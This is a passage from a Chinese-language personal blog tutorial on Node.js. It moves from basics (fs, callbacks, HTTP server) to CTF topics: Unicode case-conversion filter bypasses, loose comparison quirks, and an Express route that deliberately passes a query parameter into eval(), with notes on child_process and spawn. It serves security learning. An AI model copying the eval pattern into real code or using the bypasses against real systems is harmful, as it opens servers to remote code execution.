<!DOCTYPE html>
<html>
    <head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
  <meta name="robots" content="index, follow">
  <!-- title -->
  
    
  <title>深入浅出NodeJS - Hello Hehanzzz~</title>
    
  
  
  <!-- open graph -->
  <meta name="description" content="Hello Node.JS">
<meta property="og:type" content="article">
<meta property="og:title" content="深入浅出NodeJS">
<meta property="og:url" content="https://hehanzzz.github.io/2023/12/22/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BANodeJS/index.html">
<meta property="og:site_name" content="Hello Hehanzzz~">
<meta property="og:description" content="Hello Node.JS">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254086.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254376.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254574.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254579.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254032.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061317996.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254319.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254907.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254368.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254518.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254723.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254232.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254572.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254943.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254889.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254238.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254750.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254497.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254757.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254806.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254584.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254067.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061254526.png">
<meta property="article:published_time" content="2023-12-21T17:05:39.000Z">
<meta property="article:modified_time" content="2024-05-06T05:18:02.108Z">
<meta property="article:author" content="Hehanzzz">
<meta property="article:tag" content="NodeJS">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://oss.hehanzzz.icu/img/202405061254086.png">
  <!-- canonical -->
  
  <link rel="canonical" href="https://hehanzzz.github.io/2023/12/22/深入浅出NodeJS/">
  
  <!-- Favicon -->
  <link rel="shortcut icon" href="/img/3.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
  <!-- CSS -->
  
<link rel="stylesheet" href="/css/reset.css">

  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/markdown.css">

  
<link rel="stylesheet" href="/css/fonts.css">

<meta name="generator" content="Hexo 7.0.0"></head>

    <body>
        <div class="paper">
            <div class="paper-main">
                
                    <div class="post-header">
    <a class="logo" href="/">Hello Hehanzzz~</a>
    <!-- <div class="logo"><a href="/" title="Len"><img src="/img/logo.svg" alt="Len" aria-label="logo" height="20"></a></div> -->
        <ul class="nav">
            
            <li><a href="/">Home</a></li>
            
            <li><a href="/about">About</a></li>
            
            <li><a href="/archives">Archives</a></li>
            
            <li><a href="/friends">Friends</a></li>
            
        </ul>


    </a>
</div>


                
                <div class="post-main">
    
        <div class="post-main-title">
            深入浅出NodeJS
        </div>
        <div class="post-meta">
            2023-12-22 ｜ 
            
        </div>
        <!-- 圆角分类 -->
        <!-- <div class="tags"> -->
            <!--  -->
        <!-- </div> -->
        <div class="post-md">
            <p>Hello Node.JS</p>
<span id="more"></span>

<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><pre><code class="highlight javascript"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)
<span class="comment">//其中const为定义，也可写为let</span>
<span class="comment">//fs是自己命名的</span>
<span class="comment">//require写法固定，类似于python中的import</span>
<span class="comment">//单引号中的为fs模块，fs模块适用于读写文件</span>

<span class="comment">//Buffer：</span>
<span class="keyword">let</span> buf = <span class="title class_">Buffer</span>.<span class="title function_">alloc</span>(<span class="number">10</span>);
<span class="variable language_">console</span>.<span class="title function_">log</span>(buf);

<span class="comment">//fs模块：</span>
<span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);
fs.<span class="title function_">writeFile</span>(<span class="string">&quot;./nodejs.txt&quot;</span>,<span class="string">&quot;TestGood&quot;</span>,<span class="function"><span class="params">erro</span> =&gt;</span>&#123;
    <span class="keyword">if</span>(erro)&#123;
        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ERROR&quot;</span>);
        <span class="keyword">return</span>;
    &#125;
    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;yes!!!&quot;</span>);
&#125;);
</code></pre>

<p><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/pdf/34328813/1699247418266-f496859a-06ff-45c5-9fbf-b3acb0bc5d11.pdf">01_Buffer.pdf</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/pdf/34328813/1699247418396-743262c5-d4d4-4e7a-a636-34ff033613b2.pdf">02_fs模块.pdf</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/pdf/34328813/1699247418054-48860bf7-a134-438e-828a-3f397de0efe6.pdf">03_path模块.pdf</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/pdf/34328813/1699247418992-b6e6ae02-0105-40dd-abdc-2e1ed8e7de20.pdf">04_HTTP协议.pdf</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/pdf/34328813/1699247418334-eafd3da6-31bc-4c01-9e15-69f8e02f3fbf.pdf">05_NodeJS模块化.pdf</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/pdf/34328813/1699247418949-46669144-efdc-4241-b7ab-b7c2125e77c8.pdf">06_包管理工具.pdf</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/pdf/34328813/1699247418649-f00e9508-63e6-4545-8fcb-03e0fd6db4e4.pdf">07_nvm.pdf</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/pdf/34328813/1699247440119-628ae792-c8e5-4e9d-a67b-7f0c3758c9f6.pdf">08_express框架.pdf</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/pdf/34328813/1699247440515-d07733e0-1693-4ee9-9b33-083f488bd115.pdf">09_mongodb.pdf</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/pdf/34328813/1699247440061-9029ea26-cd4b-4348-8179-787394849a92.pdf">10_接口.pdf</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/pdf/34328813/1699247453949-81f38eeb-b25a-451c-871b-37f1eceb406b.pdf">11_会话控制.pdf</a></p>
<h2 id="变量和常量"><a href="#变量和常量" class="headerlink" title="变量和常量"></a>变量和常量</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>变量声明需要使用 <strong>var</strong> 关键字，如果没有使用 var 关键字变量会直接打印出来。<br>使用 <strong>var</strong> 关键字的变量可以使用 console.log() 来输出变量。</p>
<pre><code class="highlight javascript">$ node 
&gt; x = <span class="number">10</span> 
<span class="number">10</span> 
&gt; <span class="keyword">var</span> y = <span class="number">10</span> 
<span class="literal">undefined</span> 
&gt; x + y 
<span class="number">20</span> 
&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello World&quot;</span>) 
<span class="title class_">Hello</span> <span class="title class_">World</span> 
<span class="literal">undefined</span></code></pre>

<h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><h4 id="声明常量"><a href="#声明常量" class="headerlink" title="声明常量"></a>声明常量</h4><p>在Node.js中，const 是一个用于声明常量的关键字。当你使用 const 关键字声明一个变量时，它表示这个变量的值是不可变的，也就是说它是一个常量。<br>使用 const 声明的变量在初始化后不能再被重新赋值。这意味着你不能改变 const 变量的值，而且在尝试这样做时，会引发一个错误。<br>下面是一个示例</p>
<pre><code class="highlight javascript"><span class="keyword">const</span> pi = <span class="number">3.14159</span>; 
<span class="keyword">const</span> name = <span class="string">&#x27;John Doe&#x27;</span>; 

<span class="comment">// 错误的示例，尝试修改常量的值 </span>
pi = <span class="number">3.14</span>; <span class="comment">// 引发错误 </span>

<span class="comment">// 错误的示例，尝试重新赋值常量 </span>
name = <span class="string">&#x27;Jane Doe&#x27;</span>; <span class="comment">// 引发错误 </span></code></pre>

<p>虽然 const 声明的变量的值是不可变的，但如果变量是一个对象或数组，它们的属性或元素可以被修改。这是因为 const 只限制了变量的指向，而不限制对象或数组本身的修改</p>
<pre><code class="highlight javascript"><span class="keyword">const</span> person = &#123;   <span class="attr">name</span>: <span class="string">&#x27;John Doe&#x27;</span>,   <span class="attr">age</span>: <span class="number">30</span> &#125;; 
person.<span class="property">age</span> = <span class="number">31</span>; <span class="comment">// 合法，修改了对象的属性 </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(person); <span class="comment">// 输出: &#123; name: &#x27;John Doe&#x27;, age: 31 &#125; </span></code></pre>

<p>总的来说，const 关键字用于声明不可变的常量，防止变量的重新赋值。但对于对象或数组，const 限制的是变量指向的对象，而不限制对象本身的修改。</p>
<h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><ul>
<li>__dirname：当前模块的目录名。</li>
<li>__filename：当前模块的文件名。 这是当前的模块文件的绝对路径（符号链接会被解析）。</li>
<li>exports变量是默认赋值给 module.exports，它可以被赋予新值，它会暂时不会绑定到module.exports。</li>
<li>module：在每个模块中， module 的自由变量是对表示当前模块的对象的引用。 为方便起见，还可以通过全局模块的 exports 访问 module.exports 。 module 实际上不是全局的，而是每个模块本地的</li>
<li>require模块就不多说了，用于引入模块、 JSON、或本地文件。 可以从 node_modules 引入模块。</li>
</ul>
<pre><code class="highlight javascript"><span class="comment">// 引入 JSON 文件： </span>
<span class="keyword">const</span> jsonData = <span class="built_in">require</span>(‘./path/filename.<span class="property">json</span>’); 
<span class="comment">// 引入 node_modules 模块或 Node.js 内置模块： </span>
<span class="keyword">const</span> crypto = <span class="built_in">require</span>(‘crypto’);</code></pre>

<p>自己设置</p>
<pre><code class="highlight javascript"><span class="variable language_">global</span>.<span class="property">something</span> = <span class="number">123</span>;</code></pre>

<p><img src="http://oss.hehanzzz.icu/img/202405061254086.png"></p>
<p>经常使用的全局变量是__dirname 、__filename</p>
<h2 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h2><p>区别</p>
<ul>
<li>同步：等待每个操作完成，然后只执行下一个操作</li>
<li>异步：从不等待每个操作完成，而是只在第一步执行所有操作</li>
</ul>
<p>Node.js 异步编程的直接体现就是回调。<br>异步编程依托于回调来实现，但不能说使用了回调后程序就异步化了。<br>回调函数在完成任务后就会被调用，Node 使用了大量的回调函数，Node 所有 API 都支持回调函数。<br>例如，我们可以一边读取文件，一边执行其他命令，在文件读取完成后，我们将文件内容作为回调函数的参数返回。这样在执行代码时就没有阻塞或等待文件 I&#x2F;O 操作。这就大大提高了 Node.js 的性能，可以处理大量的并发请求。<br><strong>回调函数一般作为函数的最后一个参数出现</strong>：</p>
<pre><code class="highlight javascript"><span class="keyword">function</span> <span class="title function_">foo1</span>(<span class="params">name, age, callback</span>) &#123; &#125; 

<span class="keyword">function</span> <span class="title function_">foo2</span>(<span class="params">value, callback1, callback2</span>) &#123; &#125;</code></pre>

<h3 id="阻塞代码实例"><a href="#阻塞代码实例" class="headerlink" title="阻塞代码实例"></a>阻塞代码实例</h3><p>首先创建一个文件test.txt,文件内容是</p>
<pre><code class="highlight javascript">hello world</code></pre>

<p>创建js文件</p>
<pre><code class="highlight javascript"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>); 
<span class="keyword">var</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;test.txt&#x27;</span>); 
<span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="title function_">toString</span>()); 
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;程序执行结束!&quot;</span>);</code></pre>

<p>执行结果为</p>
<pre><code class="highlight javascript">hello world 
程序执行结束!</code></pre>

<h3 id="非阻塞代码实例"><a href="#非阻塞代码实例" class="headerlink" title="非阻塞代码实例"></a>非阻塞代码实例</h3><pre><code class="highlight javascript"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>); 
fs.<span class="title function_">readFile</span>(<span class="string">&#x27;input.txt&#x27;</span>, <span class="keyword">function</span> (<span class="params">err, data</span>) &#123;     
  <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(err);     
  <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="title function_">toString</span>()); &#125;
           ); 
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;程序执行结束!&quot;</span>);</code></pre>

<p>执行结果为</p>
<pre><code class="highlight javascript">程序执行结束! 
hello world</code></pre>

<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>在 JavaScript中，一个函数可以作为另一个函数的参数。我们可以先定义一个函数，然后传递，也可以在传递参数的地方直接定义函数。<br>Node.js 中函数的使用与 JavaScript 类似，比如说可以这样</p>
<pre><code class="highlight javascript"><span class="keyword">function</span> <span class="title function_">say</span>(<span class="params">word</span>) &#123;   
  <span class="variable language_">console</span>.<span class="title function_">log</span>(word); 
	&#125; 

<span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params">someFunction, value</span>) &#123;   
  <span class="title function_">someFunction</span>(value); 
	&#125; 

<span class="title function_">execute</span>(say, <span class="string">&quot;Hello&quot;</span>);</code></pre>

<p>以上代码中，我们把 say 函数作为 execute 函数的第一个变量进行了传递。这里传递的不是 say 的返回值，而是 say 本身！</p>
<p>这样一来， say 就变成了execute 中的本地变量 someFunction ，execute 可以通过调用 someFunction() （带括号的形式）来使用 say 函数。<br>当然，因为 say 有一个变量， execute 在调用 someFunction 时可以传递这样一个变量。</p>
<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>我们可以把一个函数作为变量传递。但是我们不一定要绕这个”先定义，再传递”的圈子，我们可以直接在另一个函数的括号中定义和传递这个函数：</p>
<pre><code class="highlight javascript"><span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params">someFunction, value</span>) &#123;   
  <span class="title function_">someFunction</span>(value); 
	&#125; 

<span class="title function_">execute</span>(<span class="keyword">function</span>(<span class="params">word</span>)&#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(word) &#125;, <span class="string">&quot;Hello&quot;</span>);</code></pre>

<p>我们在 execute 接受第一个参数的地方直接定义了我们准备传递给 execute 的函数。用这种方式，我们就不给这个函数起名字了。</p>
<h2 id="关于console"><a href="#关于console" class="headerlink" title="关于console"></a>关于console</h2><p>在Node.js中，console 是一个全局对象，它提供了一组用于在终端或命令行界面输出消息的方法。它是一种调试和日志记录工具，可用于在开发过程中输出信息，进行调试和查看变量的值。<br>我们可以这样来使用console对象</p>
<ul>
<li><strong>输出文本消息</strong>：使用 console.log() 方法输出一条或多条文本消息到控制台</li>
</ul>
<pre><code class="highlight javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello, world!&quot;</span>);</code></pre>

<ul>
<li><strong>输出变量的值</strong>：您可以通过将变量放在输出语句中来查看其当前的值。</li>
</ul>
<pre><code class="highlight javascript"><span class="keyword">const</span> name = <span class="string">&quot;John&quot;</span>; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Name:&quot;</span>, name);</code></pre>

<ul>
<li><strong>格式化输出</strong>：您可以使用占位符和格式化字符串来创建更复杂的输出。</li>
</ul>
<pre><code class="highlight javascript"><span class="keyword">const</span> age = <span class="number">30</span>; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Name: %s, Age: %d&quot;</span>, name, age);</code></pre>

<h2 id="HTTP服务"><a href="#HTTP服务" class="headerlink" title="HTTP服务"></a>HTTP服务</h2><p>来看一个示例代码</p>
<pre><code class="highlight javascript"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);<span class="comment">//首先要导入http模块 </span>

<span class="keyword">const</span> hostname = <span class="string">&#x27;127.0.0.1&#x27;</span>; <span class="comment">// 服务器主机名 </span>
<span class="keyword">const</span> port = <span class="number">8080</span>; <span class="comment">// 服务器端口 // 创建 HTTP 服务器 </span>

<span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;   
  res.<span class="property">statusCode</span> = <span class="number">200</span>; <span class="comment">// 设置响应状态码   </span>
  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>); <span class="comment">// 设置响应头的 Content-Type   </span>
  res.<span class="title function_">end</span>(<span class="string">&#x27;Hello, World!&#x27;</span>); <span class="comment">// 发送响应内容 &#125;</span>
  ); 
  
<span class="comment">// 启动服务器并监听指定的主机名和端口 </span>
server.<span class="title function_">listen</span>(port, hostname, <span class="function">() =&gt;</span> &#123;   
  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server running at http://<span class="subst">$&#123;hostname&#125;</span>:<span class="subst">$&#123;port&#125;</span>/`</span>); 
	&#125;
);</code></pre>

<p><img src="http://oss.hehanzzz.icu/img/202405061254376.png"><br>启动运行文件，访问指定的端口，HTTP服务的页面就显示出来了</p>
<h1 id="启服务"><a href="#启服务" class="headerlink" title="启服务"></a>启服务</h1><p>以一道ctf题为演示，目录中存在package.json包文件，以及server.js NodeJS服务器文件<br><img src="http://oss.hehanzzz.icu/img/202405061254574.png"></p>
<h2 id="安装package-json包"><a href="#安装package-json包" class="headerlink" title="安装package.json包"></a>安装package.json包</h2><p>在该目录下右键进入 powershell ，然后输入</p>
<pre><code class="highlight javascript">npm install</code></pre>

<p><img src="http://oss.hehanzzz.icu/img/202405061254579.png"><br>如果只是安装一个包，例如 express ，只需要输入</p>
<pre><code class="highlight javascript">npm install express</code></pre>

<h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><p>只需要输入如下，就会启动一个服务在3000端口</p>
<pre><code class="highlight javascript">node .\server.<span class="property">js</span></code></pre>

<p><img src="http://oss.hehanzzz.icu/img/202405061254032.png"></p>
<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>Vscode 中自带 NodeJS 调试功能<br><img src="http://oss.hehanzzz.icu/img/202405061317996.png"></p>
<h1 id="NodeJS中的一些特性"><a href="#NodeJS中的一些特性" class="headerlink" title="NodeJS中的一些特性"></a>NodeJS中的一些特性</h1><h2 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h2><p>toUpperCase() 在 JavaScript 中 是将小写改为大写的函数<br>但是就是在转换大小写的过程中 我们可以使用一些我们并不常见的字符 来转换出 我们所需要的字符 来绕过过滤</p>
<pre><code class="highlight javascript"><span class="string">&quot;ı&quot;</span>.<span class="title function_">toUpperCase</span>() == <span class="string">&#x27;I&#x27;</span>，<span class="string">&quot;ſ&quot;</span>.<span class="title function_">toUpperCase</span>() == <span class="string">&#x27;S&#x27;</span></code></pre>

<p><img src="http://oss.hehanzzz.icu/img/202405061254319.png"><br>相对应的 toLowerCase() 也会有相关的特性(将大写转化为小写)</p>
<pre><code class="highlight javascript"><span class="string">&quot;K&quot;</span>.<span class="title function_">toLowerCase</span>() == <span class="string">&#x27;k&#x27;</span></code></pre>

<p><img src="http://oss.hehanzzz.icu/img/202405061254907.png"></p>
<h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><p>与php相似，数字与数字字符串比较的时候，数字型字符串会被转换之后再比较</p>
<blockquote>
<p><strong>数字与数字字符串之间的比较</strong></p>
</blockquote>
<pre><code class="highlight javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>==<span class="string">&#x27;1&#x27;</span>); <span class="comment">//true </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>&gt;<span class="string">&#x27;2&#x27;</span>); <span class="comment">//false </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;1&#x27;</span>&lt;<span class="string">&#x27;2&#x27;</span>); <span class="comment">//true </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">111</span>&gt;<span class="string">&#x27;3&#x27;</span>); <span class="comment">//true </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;111&#x27;</span>&gt;<span class="string">&#x27;3&#x27;</span>); <span class="comment">//false </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;asd&#x27;</span>&gt;<span class="number">1</span>); <span class="comment">//false </span>
<span class="comment">//最后一个字符串转换后是0，所以经过比较后为false </span></code></pre>

<blockquote>
<p><strong>字符串与字符串相比较</strong></p>
</blockquote>
<pre><code class="highlight javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>([]==[]); <span class="comment">//false </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>([]&gt;[]); <span class="comment">//false </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">6</span>,<span class="number">2</span>]&gt;[<span class="number">5</span>]); <span class="comment">//true </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">100</span>,<span class="number">2</span>]&lt;<span class="string">&#x27;test&#x27;</span>); <span class="comment">//true </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">1</span>,<span class="number">2</span>]&lt;<span class="string">&#x27;2&#x27;</span>);  <span class="comment">//true </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">11</span>,<span class="number">16</span>]&lt;<span class="string">&quot;10&quot;</span>); <span class="comment">//false </span></code></pre>

<ul>
<li>空数组间的比较为false</li>
<li>数组之间比较取第一个值进行比较，如果有字符串取第一个字符进行比较</li>
<li>数组永远比非数组字符串小，比如[100,2]&lt;’test’为true</li>
</ul>
<blockquote>
<p><strong>其它比较</strong></p>
</blockquote>
<pre><code class="highlight javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span>==<span class="literal">undefined</span>) <span class="comment">// 输出：true </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span>===<span class="literal">undefined</span>) <span class="comment">// 输出：false </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span>==<span class="title class_">NaN</span>)  <span class="comment">// 输出：false </span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">NaN</span>===<span class="title class_">NaN</span>)  <span class="comment">// 输出：false</span></code></pre>

<h2 id="变量拼接"><a href="#变量拼接" class="headerlink" title="变量拼接"></a>变量拼接</h2><pre><code class="highlight javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6</span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+<span class="number">6</span>); <span class="comment">//56</span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6</span>
<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="string">&quot;6&quot;</span>,<span class="string">&quot;6&quot;</span>]); <span class="comment">//56,6</span></code></pre>

<h2 id="ES6模板字符串"><a href="#ES6模板字符串" class="headerlink" title="ES6模板字符串"></a>ES6模板字符串</h2><p>我们可以使用反引号替代括号执行函数，可以用反引号替代单引号双引号，可以在反引号内插入变量。<br>但是有一点我们需要注意，模板字符串是将字符串作为参数传入函数中，而参数是一个数组，所以数组遇到 ${} 时，字符串会被分割。</p>
<pre><code class="highlight plaintext">var node = &quot;nodejs&quot;;
console.log(&quot;hello %s&quot;,node);</code></pre>

<p><img src="http://oss.hehanzzz.icu/img/202405061254368.png"></p>
<pre><code class="highlight javascript"><span class="keyword">var</span> node = <span class="string">&quot;nodejs&quot;</span>; 
<span class="variable language_">console</span>.<span class="property">log</span><span class="string">`hello<span class="subst">$&#123;node&#125;</span>world`</span>;</code></pre>

<p><img src="http://oss.hehanzzz.icu/img/202405061254518.png"></p>
<h1 id="NodeJS中的命令执行"><a href="#NodeJS中的命令执行" class="headerlink" title="NodeJS中的命令执行"></a>NodeJS中的命令执行</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。<br>来看一个例子</p>
<pre><code class="highlight javascript"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>); 
<span class="keyword">var</span> app = <span class="title function_">express</span>(); 

app.<span class="title function_">get</span>(<span class="string">&#x27;/eval&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res</span>)&#123;     
  res.<span class="title function_">send</span>(<span class="built_in">eval</span>(req.<span class="property">query</span>.<span class="property">a</span>));     
  <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">query</span>.<span class="property">a</span>); 
&#125;) 

<span class="comment">//参数 a 通过 get 传参的方式传入运行，我们传入参数会被当作代码去执行。 </span>
<span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">1234</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;     
  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;应用实例，访问地址为 http://127.0.0.1:1234/&quot;</span>); 
&#125;)</code></pre>

<p><img src="http://oss.hehanzzz.icu/img/202405061254723.png"><br>我们可以看到 我们在上面的源码中 使用了eval函数<br>process 的作用是提供当前 node.js 进程信息并对其进行控制。<br>Node.js中的chile_process.exec调用的是&#x2F;bash.sh，它是一个bash解释器，可以执行系统命令。<br>spawn() 启动一个子进程 来执行命令 </p>
<pre><code class="highlight javascript"><span class="title function_">spawn</span>(命令,&#123;<span class="attr">shell</span>:<span class="literal">true</span>&#125;)</code></pre>

<h2 id="settimeout"><a href="#settimeout" class="headerlink" title="settimeout()"></a>settimeout()</h2><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/setTimeout">setTimeout() 全局函数 - Web API 接口参考 | MDN</a><br>该函数作用是两秒后执行函数，function 处为我们可控的参数。</p>
<pre><code class="highlight javascript"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>); 
<span class="keyword">var</span> app = <span class="title function_">express</span>(); 

<span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;   
  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;console.log(&#x27;Hacked&#x27;)&quot;</span>); 
&#125;,<span class="number">2000</span>); 

<span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">1234</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;     
  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;应用实例，访问地址为 http://127.0.0.1:1234/&quot;</span>); 
&#125;)</code></pre>

<h2 id="setinterval"><a href="#setinterval" class="headerlink" title="setinterval()"></a>setinterval()</h2><blockquote>
<p>setinterval (function,time)</p>
</blockquote>
<p>这个函数的作用是每隔两秒执行一次代码。</p>
<pre><code class="highlight javascript"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>); 
<span class="keyword">var</span> app = <span class="title function_">express</span>(); 

<span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;   
  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;console.log(&#x27;Hacked&#x27;)&quot;</span>); 
&#125;,<span class="number">2000</span>); 

<span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">1234</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;     
  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;应用实例，访问地址为 http://127.0.0.1:1234/&quot;</span>); 
&#125;)</code></pre>

<h2 id="function"><a href="#function" class="headerlink" title="function()"></a>function()</h2><blockquote>
<p>function(string)</p>
</blockquote>
<p>string 是传入的参数，这里的 function 用法类似于 php 里的 create_function。</p>
<pre><code class="highlight javascript"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>); 
<span class="keyword">var</span> app = <span class="title function_">express</span>(); 

<span class="keyword">var</span> aaa=<span class="title class_">Function</span>(<span class="string">&quot;console.log(&#x27;Hacked&#x27;)&quot;</span>)(); 

<span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">1234</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;     
